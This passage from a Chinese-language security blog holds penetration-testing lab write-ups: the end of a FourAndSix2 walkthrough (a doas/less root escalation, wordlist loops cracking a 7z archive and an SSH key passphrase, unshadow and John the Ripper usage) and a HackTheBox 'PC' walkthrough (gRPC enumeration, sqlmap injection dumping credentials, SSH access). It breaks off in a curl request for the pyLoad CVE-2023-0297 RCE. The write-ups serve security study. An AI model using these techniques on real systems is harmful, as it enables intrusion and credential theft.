class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">fourandsix2$ <span class="hljs-built_in">cat</span> doas.conf<br>permit nopass keepenv user as root cmd /usr/bin/less args /var/log/authlog<br>permit nopass keepenv root as root<br></code></pre></td></tr></table></figure><p>emmm，不能说一模一样，但也是差不多</p><p><img src="/pic/1a56c43b35e9c8067bf309b3674856df_MD5.png"></p><h3 id="less-新启-shell"><a href="#less-新启-shell" class="headerlink" title="less 新启 shell"></a>less 新启 shell</h3><p>这里有新建 shell 的手法（v 是打开 vi 编辑器），我们按照 gtfobins 来新启一个 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">fourandsix2$ doas -u root /usr/bin/less /var/log/authlog                                                            <br>                                                                                                                    <br>fourandsix2<span class="hljs-comment"># id                                                                                                     </span><br>uid=0(root) gid=0(wheel) <span class="hljs-built_in">groups</span>=0(wheel), 2(kmem), 3(sys), 4(<span class="hljs-built_in">tty</span>), 5(operator), 20(staff), 31(guest)                <br>fourandsix2<span class="hljs-comment"># cd /root  </span><br>fourandsix2<span class="hljs-comment"># ls</span><br>.Xdefaults .cshrc     .cvsrc     .forward   .login     .profile   .ssh       flag.txt<br>fourandsix2<span class="hljs-comment"># cat flag.txt</span><br>Nice you hacked all the passwords!<br><br>Not all tools worked well. But with some <span class="hljs-built_in">command</span> magic...:<br><span class="hljs-built_in">cat</span> /usr/share/wordlists/rockyou.txt|<span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line; <span class="hljs-keyword">do</span> 7z e backup.7z -p<span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span> -oout; <span class="hljs-keyword">if</span> grep -iRl SSH; <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span>; <span class="hljs-built_in">break</span>;<span class="hljs-keyword">fi</span>;<span class="hljs-keyword">done</span><br><br><span class="hljs-built_in">cat</span> /usr/share/wordlists/rockyou.txt|<span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line; <span class="hljs-keyword">do</span> <span class="hljs-keyword">if</span> ssh-keygen -p -P <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span> -N password -f id_rsa; <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span>; <span class="hljs-built_in">break</span>;<span class="hljs-keyword">fi</span>;<span class="hljs-keyword">done</span><br><br><br>Here is the flag:<br>acd043bc3103ed3dd02eee99d5b0ff42<br>fourandsix2<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>成功！</p><h2 id="拾遗"><a href="#拾遗" class="headerlink" title="拾遗"></a>拾遗</h2><h3 id="挂载命令"><a href="#挂载命令" class="headerlink" title="挂载命令"></a>挂载命令</h3><blockquote><p>1.目录事先存在，可以用 mkdir 命令新建目录<br>2.挂载点目录不可被其他进程使用到<br>3.挂载点下原有文件将被隐藏</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">//显示挂载点<br>showmount -e IP<br><br>//挂载到本地<br><span class="hljs-built_in">mkdir</span> /tmp/infosec<br>sudo mount -t nfs IP:/path /tmp/infosec<br><br>//卸载<br>sudo umount <br></code></pre></td></tr></table></figure><blockquote><p>-t 指定文件系统的类型，通常不必指定。mount 会自动选择正确的类型。常用类型有：<br>光盘或光盘镜像：iso9660;<br>DOS fat16 文件系统：msdos;<br>Windows 9x fat32 文件系统：vfat;<br>Windows NT ntfs 文件系统：ntfs;<br>Mount Windows 文件网络共享：smbfs;<br>UNIX (LINUX) 文件网络共享：nfs</p></blockquote><h3 id="john-爆破工具"><a href="#john-爆破工具" class="headerlink" title="john 爆破工具"></a>john 爆破工具</h3><h4 id="Linux-哈希爆破"><a href="#Linux-哈希爆破" class="headerlink" title="Linux 哈希爆破"></a>Linux 哈希爆破</h4><p>JtR 破解的文件必须有特定的格式。要转换 passwd 和 shadow 文件，我们需要利用&#x2F;usr&#x2F;sbin&#x2F;unshade 可执行文件。这需要超级用户权限才能执行。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo <span class="hljs-regexp">/usr/</span>sbin<span class="hljs-regexp">/unshadow /</span>etc<span class="hljs-regexp">/passwd /</span>etc<span class="hljs-regexp">/shadow &gt; ~/</span>passwords.txt<br>john --wordlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt ~/passwords.txt<br></code></pre></td></tr></table></figure><h4 id="转化为-JTR-兼容的工具"><a href="#转化为-JTR-兼容的工具" class="headerlink" title="转化为 JTR 兼容的工具"></a>转化为 JTR 兼容的工具</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/FourAndSix]<br>└─$ locate *2john <br>/usr/sbin/bitlocker2john<br>/usr/sbin/dmg2john<br>/usr/sbin/gpg2john<br>/usr/sbin/hccap2john<br>/usr/sbin/keepass2john<br>/usr/sbin/putty2john<br>/usr/sbin/racf2john<br>/usr/sbin/rar2john<br>/usr/sbin/uaf2john<br>/usr/sbin/vncpcap2john<br>/usr/sbin/wpapcap2john<br>/usr/sbin/zip2john<br></code></pre></td></tr></table></figure><h4 id="SSH-密钥密码破解"><a href="#SSH-密钥密码破解" class="headerlink" title="SSH 密钥密码破解"></a>SSH 密钥密码破解</h4><p>要测试JTR的SSH密钥密码破解能力，首先要创建一组新的私钥。注意：JTR没有破解文件本身(即生成的密钥中的字节数并不重要)，JTR只是破解私钥的加密密码。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-keyword">Create</span> <span class="hljs-keyword">some</span> private key<br>ssh-keygen -t rsa -b <span class="hljs-number">4096</span><br># <span class="hljs-keyword">Create</span> <span class="hljs-keyword">encrypted</span> zip<br>/usr/sbin/ssh2john ~/.ssh/id_rsa &gt; id_rsa.hash<br></code></pre></td></tr></table></figure><p>接下来，您需要做的就是使用您的字典将 John the Ripper 指向给定文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>sbin<span class="hljs-regexp">/john --wordlist=/u</span>sr<span class="hljs-regexp">/share/</span>wordlists/rockyou.txt id_rsa.hash<br></code></pre></td></tr></table></figure><h3 id="doas-命令的始末"><a href="#doas-命令的始末" class="headerlink" title="doas 命令的始末"></a>doas 命令的始末</h3><p>来自维基百科的解释</p><blockquote><p>doas (“do as”)是一个用来以其他用户身份执行指令的程序。系统管理员可以对其进行设置，赋予指定用户执行特定指令的权限。其为以 ISC 许可证许可的自由及开放源代码软件，可在 UNIX 与类 Unix 操作系统中使用。doas 是由 Ted Unangst 为 OpenBSD 所开发的，是一种更简单且更安全的 sudo 替代品<br>权限的定义皆编写于配置文件 <code>/etc/doas.conf</code> 中</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PC靶机</title>
    <link href="/2023/05/8697a8337304.html"/>
    <url>/2023/05/8697a8337304.html</url>
    
    <content type="html"><![CDATA[<p>本身并不是特别难的靶机，但是在 getshell 的过程中，需要足够的信息收集能力，提权的过程也并不复杂，不过需要一定的经验。</p><h1 id="PC-靶机"><a href="#PC-靶机" class="headerlink" title="PC 靶机"></a>PC 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/Downloads]<br>└─$ sudo nmap -sT -sV -O -p22,50051 10.10.11.214<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 07:28 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.214<br>Host is up (0.0034s latency).<br><br>PORT      STATE SERVICE VERSION<br>22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)<br>50051/tcp open  unknown<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port50051-TCP:V=7.93%I=7%D=5/31%Time=64772F74%P=x86_64-pc-linux-gnu%r(N<br>SF:ULL,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x0</span><br><span class="hljs-string">SF:6\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&quot;</span>)%r(Generic<br>SF:Lines,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\</span><br><span class="hljs-string">SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&quot;</span>)%r(GetRe<br>SF:quest,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\</span><br><span class="hljs-string">SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&quot;</span>)%r(HTTPO<br>SF:ptions,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0</span><br><span class="hljs-string">SF:\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&quot;</span>)%r(RTSP<br>SF:Request,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\</span><br><span class="hljs-string">SF:0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&quot;</span>)%r(RPC<br>SF:Check,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\</span><br><span class="hljs-string">SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&quot;</span>)%r(DNSVe<br>SF:rsionBindReqTCP,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\</span><br><span class="hljs-string">SF:xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0</span><br><span class="hljs-string">SF:&quot;</span>)%r(DNSStatusRequestTCP,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0</span><br><span class="hljs-string">SF:\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\</span><br><span class="hljs-string">SF:0\0\?\0\0&quot;</span>)%r(Help,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0</span><br><span class="hljs-string">SF:\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\</span><br><span class="hljs-string">SF:0\0&quot;</span>)%r(SSLSessionReq,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x0</span><br><span class="hljs-string">SF:5\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0</span><br><span class="hljs-string">SF:\?\0\0&quot;</span>)%r(TerminalServerCookie,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf</span><br><span class="hljs-string">SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0</span><br><span class="hljs-string">SF:\0\0\0\0\0\?\0\0&quot;</span>)%r(TLSSessionReq,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?</span><br><span class="hljs-string">SF:\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x0</span><br><span class="hljs-string">SF:8\0\0\0\0\0\0\?\0\0&quot;</span>)%r(Kerberos,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x</span><br><span class="hljs-string">SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\</span><br><span class="hljs-string">SF:0\0\0\0\0\0\?\0\0&quot;</span>)%r(SMBProgNeg,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x</span><br><span class="hljs-string">SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\</span><br><span class="hljs-string">SF:0\0\0\0\0\0\?\0\0&quot;</span>)%r(X11Probe,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff</span><br><span class="hljs-string">SF:\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\</span><br><span class="hljs-string">SF:0\0\0\0\0\?\0\0&quot;</span>);<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose|specialized<br>Running (JUST GUESSING): Linux 5.X|4.X|2.6.X (98%), Crestron 2-Series (90%)<br>OS CPE: cpe:/o:linux:linux_kernel:5.0 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:crestron:2_series<br>Aggressive OS guesses: Linux 5.0 (98%), Linux 4.15 - 5.6 (92%), Linux 5.0 - 5.4 (91%), Linux 5.3 - 5.4 (91%), Linux 2.6.32 (91%), Linux 5.0 - 5.3 (90%), Linux 5.4 (90%), Crestron XPanel control system (90%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 11.32 seconds<br></code></pre></td></tr></table></figure><p>22 端口 ssh 服务的渗透优先级较低，50051 的服务并没有被识别出来，漏洞脚本扫描也失败。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/Downloads]<br>└─$ sudo nmap --script=vuln -p22,50051 10.10.11.214<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 07:30 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.214<br>Host is up (0.0035s latency).<br><br>PORT      STATE SERVICE<br>22/tcp    open  ssh<br>50051/tcp open  unknown<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 10.69 seconds<br></code></pre></td></tr></table></figure><p>只能借助于网络搜索了，查了一下，50051 大概率是 gRPC 服务，博客末尾附上 gRPC 的详解。这里简单介绍一下，gRPC 是谷歌发起的一个开源远程过程调用系统，基于 HTTP&#x2F;2 协议传输</p><blockquote><p>在 gPRC 里客户端可以向调用本地对象一样直接调用另一台不同机器上服务端应用的方法，使得您能够更容易地创建分布式应用和服务。</p></blockquote><p>在如何利用 gPRC 方面，找到了一篇博客：<a href="https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9">gRPC Security Series: Part 3. Security Vulnerabilities in gRPC | by IBM PTC Security | Medium</a></p><p>博客中涉及几个工具和环境，包括：go 环境、grpcurl、grpcui、Burpsuite。grpcurl 和 grpcui 的安装使用 go install 命令即可，在不指定环境变量中的路径的情况下，go get 安装的工具会放在用户目录下的 go&#x2F;bin 文件夹里。关于安装时参考了这篇文章：<a href="https://princepereira.medium.com/install-grpccurl-in-ubuntu-6ad71fd3ed31">Install grpccurl in Ubuntu. grpcurl is a command-line tool that… | by Prince Pereira | Medium</a></p><h2 id="端口渗透"><a href="#端口渗透" class="headerlink" title="端口渗透"></a>端口渗透</h2><p>接下来就是按照博客中的提示，逐步去尝试的过程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/go/bin]<br>└─$ ./grpcurl -plaintext 10.10.11.214:50051 list<br>SimpleApp<br>grpc.reflection.v1alpha.ServerReflection<br><br>┌──(i3eg1nner㉿minilite)-[~/go/bin]<br>└─$ ./grpcurl -plaintext 10.10.11.214:50051 list SimpleApp<br>SimpleApp.LoginUser<br>SimpleApp.RegisterUser<br>SimpleApp.getInfo<br></code></pre></td></tr></table></figure><p>通过 grpcurl 工具查看了服务，接下来需要使用 grpcui 来在网页端查看，这个网页中的功能框由三个功能可以切换，分别是 LoginUser,RegisterUser,getInfo，在使用 getInfo 的时候，返回信息是没有 token，那我们先注册一下吧。除此之外需要注意得是，注册后一段时间，账户信息会自动清除，操作必须迅速一些，下图是注册信息</p><p><img src="/pic/7f71a2afc501e4da08e13d6d3c7fdfd0_MD5.png"></p><p>注册后返回了注册成功，登录后返回 id 和 token，注意这里我们关注的是 token 中单引号之间内容</p><p><img src="/pic/20069ceefb6d54632c3345300c47fd58_MD5.png"></p><p>getInfo 中输入 2 时返回的结果</p><p><img src="/pic/afe150636345e451f58bb2a09dace4c0_MD5.png"></p><p>getinfo 输入 1 时返回的结果</p><p><img src="/pic/2675756667f5206e2f7e06d978dc6c78_MD5.png"></p><h3 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h3><p>根据这个 token，我们尝试 getInfo 的功能，当输入非预期的字符的时候有报错，这就存在 SQL 注入的可能，接下来我们使用 burpsuite 抓包，然后另存为，将其保存下来以便使用sqlmap</p><p><img src="/pic/ad2202f8c5ec83c12ae9b0fa219f9de2_MD5.png"></p><p><code>sqlmap -r pc -p id</code></p><p><img src="/pic/e6cc60c03aa8cd6eb6ee2278b88d1192_MD5.png"></p><p><code>sqlmap -r pc -p id --tables</code></p><p><img src="/pic/fb265b18c76b3eb2c7fb30560c256672_MD5.png"></p><p><code>sqlmap -r pc -p id -D SQLite_masterdb -T accounts --columns</code></p><p><img src="/pic/41cd5c3a588aa898ec3ca3c96e02f55d_MD5.png"></p><p><code>sqlmap -r pc -p id -D SQLite_masterdb -T accounts --batch --threads 5 --dump</code></p><p><img src="/pic/064fd12e814a363df0baeb899283b747_MD5.png"></p><h2 id="获取初步-shell"><a href="#获取初步-shell" class="headerlink" title="获取初步 shell"></a>获取初步 shell</h2><p>得到了用户名和密码，接下来尝试 ssh 登录一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ ssh sau@10.10.11.214<br>The authenticity of host \&#x27;10.10.11.214 (10.10.11.214)&#x27; can&#x27;t be established.<br>ED25519 key fingerprint is SHA256:63yHg6metJY5dfzHxDVLi4Zpucku6SuRziVLenmSmZg.<br>This key is not known by any other names.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added &#x27;10.10.11.214&#x27; (ED25519) to the list of known hosts.<br>sau@10.10.11.214\&#x27;s password: <br>Last login: Wed May 31 06:48:37 2023 from 10.10.14.40<br>sau@pc:~$ whoami<br>sau<br>sau@pc:~$ ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    link/ether 00:50:56:b9:21:5e brd ff:ff:ff:ff:ff:ff<br>    inet 10.10.11.214/23 brd 10.10.11.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::250:56ff:feb9:215e/64 scope link <br>       valid_lft forever preferred_lft forever<br>sau@pc:~$ sudo -l<br>[sudo] password for sau: <br>Sorry, user sau may not run sudo on localhost.<br>sau@pc:~$ uname -a<br>Linux pc 5.4.0-148-generic #165-Ubuntu SMP Tue Apr 18 08:53:12 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux<br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>登录成功，接下来进行提权的操作，定时任务中没有有效信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">sau@pc:~$ <span class="hljs-built_in">id</span><br>uid=1001(sau) gid=1001(sau) <span class="hljs-built_in">groups</span>=1001(sau)<br>sau@pc:~$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name command to be executed</span><br>17 ** * *root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6* * *root<span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6* * 7root<span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 61 * *root<span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>查看网络端口状态，发现 127.0.0.1:8000 端口跑了一个服务，那就考虑使用 SSH 隧道，在本地浏览器查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">sau@pc:~$ netstat -nat<br>Active Internet connections (servers and established)<br>Proto Recv-Q Send-Q Local Address           Foreign Address         State      <br>tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     <br>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     <br>tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     <br>tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN     <br>tcp        0      0 10.10.11.214:22         10.10.14.40:53522       ESTABLISHED<br>tcp        0    208 10.10.11.214:22         10.10.14.30:47880       ESTABLISHED<br>tcp        0      0 10.10.11.214:22         10.10.14.40:44572       ESTABLISHED<br>tcp        0      0 10.10.11.214:22         10.10.16.8:38773        ESTABLISHED<br>tcp        0      0 10.10.11.214:22         10.10.16.8:36229        FIN_WAIT2  <br>tcp6       0      0 :::22                   :::*                    LISTEN     <br>tcp6       0      0 :::50051                :::*                    LISTEN     <br>tcp6       0      0 10.10.11.214:50051      10.10.14.30:39562       ESTABLISHED<br><br></code></pre></td></tr></table></figure><p>看起来是个后台登录界面，在谷歌上搜一下它的 exploit，发现存在一个 CVE 编号的代码执行漏洞</p><p><img src="/pic/dd4782deda7a8dd87b343539b71d1193_MD5.png"></p><h3 id="CVE-2023-0297-Pre-auth-RCE-in-pyLoad"><a href="#CVE-2023-0297-Pre-auth-RCE-in-pyLoad" class="headerlink" title="CVE-2023-0297: Pre-auth RCE in pyLoad"></a>CVE-2023-0297: Pre-auth RCE in pyLoad</h3><p><img src="/pic/17699193c4c6826b2369fedf6b8c272b_MD5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -i -s -k -X $<span class="hljs-string">&#x27;POST&#x27;</span> \<br>    --data-binary $<span 